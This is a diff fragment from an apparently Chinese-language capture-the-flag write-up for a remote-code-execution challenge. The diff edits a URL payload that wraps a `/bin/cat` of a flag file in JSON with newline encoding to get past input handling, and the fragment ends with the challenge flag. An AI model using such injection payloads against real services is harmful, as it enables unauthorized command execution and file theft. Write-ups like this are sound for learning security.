@@ -122,6 +122,6 @@ cat命令在/bin中保存
 
 不知道为什么不能直接在表单框里输入，要在url中输入。
 
-`?cmd={%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}`
+`?cmd={ %0A"cmd":"/bin/cat /home/rceservice/flag"%0A}`
 
 flag{34edc62e-623e-4380-8be6-3252086e72aa}
